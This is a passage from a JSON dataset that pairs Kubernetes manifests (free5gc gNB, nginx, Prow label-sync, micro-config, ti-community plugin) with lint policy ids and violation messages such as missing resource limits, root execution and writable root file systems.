    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"free5gc-ueransim-gnb\" has memory limit 0"
  },
  {
    "id": "10927",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tcpdump\" has memory limit 0"
  },
  {
    "id": "10928",
    "manifest_path": "data/manifests/the_stack_sample/sample_4198.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.16\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10929",
    "manifest_path": "data/manifests/the_stack_sample/sample_4198.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.16\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10930",
    "manifest_path": "data/manifests/the_stack_sample/sample_4198.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.16\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10931",
    "manifest_path": "data/manifests/the_stack_sample/sample_4198.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.16\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10932",
    "manifest_path": "data/manifests/the_stack_sample/sample_4198.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.16\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10933",
    "manifest_path": "data/manifests/the_stack_sample/sample_4200.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210112-5eaf960e10\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "10934",
    "manifest_path": "data/manifests/the_stack_sample/sample_4200.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210112-5eaf960e10\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "10935",
    "manifest_path": "data/manifests/the_stack_sample/sample_4200.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210112-5eaf960e10\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "10936",
    "manifest_path": "data/manifests/the_stack_sample/sample_4200.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210112-5eaf960e10\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "10937",
    "manifest_path": "data/manifests/the_stack_sample/sample_4201.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-config\n  labels:\n    name: micro-config\n    micro: runtime\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: micro-config\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-config\n        micro: runtime\n    spec:\n      containers:\n      - name: micro-config\n        env:\n        - name: MICRO_AUTH\n          value: jwt\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_AUTH_PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: private\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_STORE\n          value: cockroach\n        - name: MICRO_STORE_ADDRESS\n          value: postgres://root@cockroachdb-public:26257/?sslmode=disable\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        command:\n        - /micro\n        - config\n        ports:\n        - containerPort: 8080\n          name: service\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"micro-config\" is using an invalid container image, \"agus7fauzi/hari\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10938",
    "manifest_path": "data/manifests/the_stack_sample/sample_4201.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-config\n  labels:\n    name: micro-config\n    micro: runtime\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: micro-config\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-config\n        micro: runtime\n    spec:\n      containers:\n      - name: micro-config\n        env:\n        - name: MICRO_AUTH\n          value: jwt\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_AUTH_PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: private\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_STORE\n          value: cockroach\n        - name: MICRO_STORE_ADDRESS\n          value: postgres://root@cockroachdb-public:26257/?sslmode=disable\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        command:\n        - /micro\n        - config\n        ports:\n        - containerPort: 8080\n          name: service\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"micro-config\" does not have a read-only root file system"
  },
  {
    "id": "10939",
    "manifest_path": "data/manifests/the_stack_sample/sample_4201.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-config\n  labels:\n    name: micro-config\n    micro: runtime\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: micro-config\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-config\n        micro: runtime\n    spec:\n      containers:\n      - name: micro-config\n        env:\n        - name: MICRO_AUTH\n          value: jwt\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_AUTH_PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: private\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_STORE\n          value: cockroach\n        - name: MICRO_STORE_ADDRESS\n          value: postgres://root@cockroachdb-public:26257/?sslmode=disable\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        command:\n        - /micro\n        - config\n        ports:\n        - containerPort: 8080\n          name: service\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"micro-config\" is not set to runAsNonRoot"
  },
  {
    "id": "10940",
    "manifest_path": "data/manifests/the_stack_sample/sample_4201.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-config\n  labels:\n    name: micro-config\n    micro: runtime\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: micro-config\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-config\n        micro: runtime\n    spec:\n      containers:\n      - name: micro-config\n        env:\n        - name: MICRO_AUTH\n          value: jwt\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_AUTH_PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: private\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_STORE\n          value: cockroach\n        - name: MICRO_STORE_ADDRESS\n          value: postgres://root@cockroachdb-public:26257/?sslmode=disable\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        command:\n        - /micro\n        - config\n        ports:\n        - containerPort: 8080\n          name: service\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"micro-config\" has cpu request 0"
  },
  {
    "id": "10941",
    "manifest_path": "data/manifests/the_stack_sample/sample_4201.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-config\n  labels:\n    name: micro-config\n    micro: runtime\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: micro-config\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-config\n        micro: runtime\n    spec:\n      containers:\n      - name: micro-config\n        env:\n        - name: MICRO_AUTH\n          value: jwt\n        - name: MICRO_AUTH_PUBLIC_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: public\n        - name: MICRO_AUTH_PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: micro-keypair\n              key: private\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_STORE\n          value: cockroach\n        - name: MICRO_STORE_ADDRESS\n          value: postgres://root@cockroachdb-public:26257/?sslmode=disable\n        image: agus7fauzi/hari\n        imagePullPolicy: Always\n        command:\n        - /micro\n        - config\n        ports:\n        - containerPort: 8080\n          name: service\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"micro-config\" has memory limit 0"
  },
  {
    "id": "10942",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"ti-community-contribution\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10943",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ti-community-contribution\" does not have a read-only root file system"
  },
  {
    "id": "10944",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "10945",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"ti-community-contribution\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10946",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ti-community-contribution\" is not set to runAsNonRoot"
  },
  {
    "id": "10947",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ti-community-contribution\" has cpu request 0"
  },
  {
    "id": "10948",
    "manifest_path": "data/manifests/the_stack_sample/sample_4202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-contribution\n  labels:\n    app: ti-community-contribution\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-contribution\n  template:\n    metadata:\n      labels:\n        app: ti-community-contribution\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-contribution\n        image: ticommunityinfra/tichi-contribution-plugin:v1.9.2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ti-community-contribution\" has memory limit 0"
  },
  {
    "id": "10949",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
